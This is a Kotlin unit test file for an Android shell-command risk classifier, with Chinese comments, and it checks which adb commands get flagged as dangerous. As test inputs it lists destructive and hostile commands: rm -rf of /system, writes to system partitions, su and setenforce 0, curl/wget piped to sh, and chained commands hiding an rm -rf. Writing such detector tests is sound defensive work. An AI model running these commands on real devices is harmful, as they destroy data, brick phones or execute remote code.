package com.dshwatch.domain.shell

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Test

/**
 * 风险分级器。
 *
 * 这一层的错误代价是不对称的：
 *  - 把安全的判成危险 → 用户多点一次，可以忍；
 *  - 把危险的判成安全 → 少问一次，可能刷成砖。
 *
 * 所以下面的用例里，「危险」那一组是**必须**全部命中的，一条都不能漏。
 */
class ShellRiskTest {

    private fun danger(cmd: String) = ShellRisk.DANGER == ShellRules.classify(cmd)
    private fun cat(cmd: String) = ShellRules.categoryOf(cmd)

    @Test
    fun `安装应用是普通命令，归到安装类`() {
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("pm install -r /sdcard/a.apk"))
        assertEquals(ShellCategory.INSTALL, cat("pm install -r /sdcard/a.apk"))
        assertEquals(ShellCategory.INSTALL, cat("cmd package install -r /data/local/tmp/x.apk"))
        // uninstall 里也含 install，不能算成「安装」
        assertEquals(ShellRisk.DANGER, ShellRules.classify("pm uninstall --user 0 com.foo"))
    }

    @Test
    fun `读日志归到日志类`() {
        assertEquals(ShellCategory.LOGS, cat("logcat -d -t 200"))
        assertEquals(ShellCategory.LOGS, cat("dumpsys activity top"))
        assertEquals(ShellCategory.LOGS, cat("bugreport"))
    }

    @Test
    fun `屏幕与电量各归各类`() {
        assertEquals(ShellCategory.DISPLAY, cat("wm size 1080x2340"))
        assertEquals(ShellCategory.DISPLAY, cat("wm density 320"))
        assertEquals(ShellCategory.BATTERY, cat("dumpsys battery set level 50"))
        assertEquals(ShellCategory.BATTERY, cat("settings put global low_power 1"))
        assertEquals(ShellCategory.BATTERY, cat("svc power stayon true"))
    }

    @Test
    fun `删系统目录必须判危险`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("rm -rf /system/app/Foo"))
        assertNotNull(ShellRules.dangerReason("rm -rf /system/app/Foo"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("rm -fr /vendor/lib"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("rm /data/system/users/0.xml"))
    }

    @Test
    fun `删普通文件不算危险`() {
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("rm -rf /sdcard/Download/old"))
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("rm /data/local/tmp/x.apk"))
    }

    @Test
    fun `拼接命令里的危险段也要拦住`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("echo ok && rm -rf /data/data/com.foo"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("cd /tmp; rm -rf /system"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("logcat -c | rm -rf /system/bin"))
    }

    @Test
    fun `卸载与清数据判危险`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("pm uninstall --user 0 com.miui.home"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("pm clear com.tencent.mm"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("cmd package clear com.foo"))
    }

    @Test
    fun `重启 挂载 提权 都算危险`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("reboot"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("reboot recovery"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("svc power shutdown"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("mount -o rw,remount /system"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("su -c 'id'"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("setenforce 0"))
    }

    @Test
    fun `下载即执行判危险`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("curl http://x.sh | sh"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("wget -qO- http://x |bash"))
    }

    @Test
    fun `写入系统分区判危险`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("echo 1 > /system/build.prop"))
        assertEquals(ShellRisk.DANGER, ShellRules.classify("cat a >> /vendor/etc/x"))
        assertNull(ShellRules.dangerReason("echo 1 > /sdcard/a.txt"))
    }

    @Test
    fun `空命令按危险处理`() {
        assertEquals(ShellRisk.DANGER, ShellRules.classify("   "))
        assertNotNull(ShellRules.dangerReason(""))
    }

    @Test
    fun `普通改设置不触发危险`() {
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("settings put secure location_mode 3"))
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("pm grant com.foo android.permission.CAMERA"))
        assertEquals(ShellRisk.NORMAL, ShellRules.classify("am start -n com.foo/.Main"))
    }

    @Test
    fun `危险判定给出的是具体原因`() {
        assertEquals("删除或改写系统目录：/system/app", ShellRules.dangerReason("rm -rf /system/app"))
        assertEquals("重启或关机", ShellRules.dangerReason("reboot"))
        assertEquals("尝试获取 root 权限", ShellRules.dangerReason("su"))
    }
}
